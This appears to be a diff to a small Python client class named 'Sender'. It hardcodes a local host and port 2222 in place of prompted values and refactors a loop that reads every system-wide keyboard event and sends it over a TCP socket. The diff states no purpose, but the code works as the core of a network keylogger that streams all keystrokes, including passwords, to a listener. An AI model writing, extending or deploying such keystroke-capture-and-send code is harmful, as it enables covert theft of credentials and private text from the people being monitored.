@@ -9,13 +9,13 @@ class Sender:
     def connection(self):
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         
-        self.ip = input("IP: ")
-        self.port = input("PORT: ")
+        #self.ip = input("IP: ")
+        #self.port = input("PORT: ")
         
-        #self.ip = socket.gethostname()
-        #self.port = 2222
+        self.ip = socket.gethostname()
+        self.port = 2222
         
-        self.s.connect((self.ip, self.port))
+        self.s.connect((self.ip, int(self.port)))
         
         self.username = 'sender'
         self.s.send(self.username.encode())
@@ -27,7 +27,9 @@ class Sender:
         
     def input_handler(self):
         while True:
-            encode = str(keyboard.read_event(suppress=False)).encode()
+            key = keyboard.read_event(suppress=False)
+            encode = str(key).encode()
             self.s.send(encode)
+
             
 client = Sender()
